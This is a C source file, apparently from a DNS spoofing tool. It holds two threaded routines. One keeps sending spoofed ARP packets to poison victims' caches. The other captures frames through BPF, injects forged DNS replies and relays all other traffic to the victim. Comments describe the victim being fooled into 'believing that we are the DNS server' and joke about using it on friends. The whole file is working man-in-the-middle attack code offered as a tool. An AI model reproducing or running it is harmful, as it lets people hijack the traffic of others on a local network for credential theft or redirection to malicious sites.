#include "netbots.h"
#include "types.h"
#include "arpspf.h"
#include "if.h"
#include "layer1sk.h"
#include "arpspf.h"
#include "dnsspf.h"
#include "dnscore.h"
#include "mem.h"
#include "sockio.h"
#include "watchdogs.h"
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <stdio.h>
#include <string.h>
#include <net/bpf.h>

void *dnsf_ckr_arp_spoofing_bot_routine(void *vargs) {
    struct dnsf_ckr_bot_routine_ctx *args = (struct dnsf_ckr_bot_routine_ctx *)vargs;
    dnsf_ckr_realdnstransactions_ctx *transactions = (dnsf_ckr_realdnstransactions_ctx *)args->arg[0];
    dnsf_ckr_realdnstransactions_ctx *tp;
    char *lo_mac = dnsf_ckr_get_iface_mac((char *)args->arg[1]);
    int sent_nr = *(int *)args->arg[3];
    char spf_ip[0xff], dest_ip[0xff];
    struct in_addr src_in, dest_in;
    while (!dnsf_ckr_should_abort()) {
        for (tp = transactions; tp; tp = tp->next) {
            src_in.s_addr = tp->sends_reqs_to->addr;
            dest_in.s_addr = tp->victim->addr;
            sprintf(spf_ip, "%s", inet_ntoa(src_in));
            sprintf(dest_ip, "%s", inet_ntoa(dest_in));
            dnsf_ckr_spoof_mac(lo_mac, spf_ip, tp->victim->hw_addr, dest_ip, sent_nr, 100);
            usleep(10);
        }
    }
    free(lo_mac);
    return NULL;
}

void *dnsf_ckr_fakeserver_bot_routine(void *vargs) {
    struct dnsf_ckr_bot_routine_ctx *args = (struct dnsf_ckr_bot_routine_ctx *)vargs;
    dnsf_ckr_realdnstransactions_ctx *transactions = (dnsf_ckr_realdnstransactions_ctx *)args->arg[0];
    dnsf_ckr_fakenameserver_ctx *fakeserver = (dnsf_ckr_fakenameserver_ctx *)args->arg[1];
    dnsf_ckr_sockio_data_ctx *packets = NULL, *p;
    unsigned char *rawpkt = NULL;
    unsigned char src_mac[6];
    size_t rawpktsz;
    dnsf_ckr_action_t action;
    while (!dnsf_ckr_should_abort()) {
        packets = dnsf_ckr_bpf_read();
        if (packets != NULL) {
            for (p = packets; p; p = p->next) {
                if (p->dsize < 14) continue;
                action = dnsf_ckr_action_none;
                //  ok people, all nasty goes from here...
                if (*(p->data + 12) == 0x08 && *(p->data + 13) == 0x00) {
                    memcpy(src_mac, p->data, sizeof(src_mac));
                    rawpkt = NULL;
                    action = dnsf_ckr_proc_ip_packet(p->data + 14, p->dsize - 14, &rawpkt, &rawpktsz, transactions, fakeserver, src_mac);
                }
                switch (action) {
                    case dnsf_ckr_action_repass: //  here we only will repass and the layer-1 will be already corrected.
                        //  INFO(Santiago): don't touch... just echoing to the victim's machine what we grabbed..
                        //  ..but first we need to correct the ethernet frame.
                        action = dnsf_ckr_proc_eth_frame(p->data, p->dsize, &rawpkt, &rawpktsz, transactions);
                        if (action == dnsf_ckr_action_none) {
                            rawpkt = p->data;
                            rawpktsz = p->dsize;
                        }
                        break;
                    case dnsf_ckr_action_spoof:
                        //  INFO(Santiago): the dns reply was already assembled by dnsf_ckr_proc_ip_packet() call and now all we need to do
                        //  is to repass it to the computer's victim which is believing that we are the DNS server..
                        printf("dnsf_ckr INFO: spoof attempt done.\n");
                        break;
                    default:
                        //  INFO(Santiago): even with ethernet frame layer-3 protocol being not equals to 0x0800 (IP)
                        //  in some cases we need to correct the ethernet frame MAC destination field and then repass
                        //  it to the "sheep" computer (a.k.a. your friend [in troll environments]).
                        action = dnsf_ckr_proc_eth_frame(p->data, p->dsize, &rawpkt, &rawpktsz, transactions);
                        break;
                }
                if (rawpkt != NULL) {
                    dnsf_ckr_bpf_write(rawpkt, rawpktsz); //  ..MuHauHauAHuahAUhUahUAhAUHAUHh! :)
                    if (rawpkt != p->data) {
                        free(rawpkt);
                    }
                    rawpkt = NULL;
                }
            }
            if (packets != NULL) {
                del_dnsf_ckr_sockio_data_ctx(packets);
                packets = NULL;
            }
        }
        usleep(1);
    }
    return NULL;
}
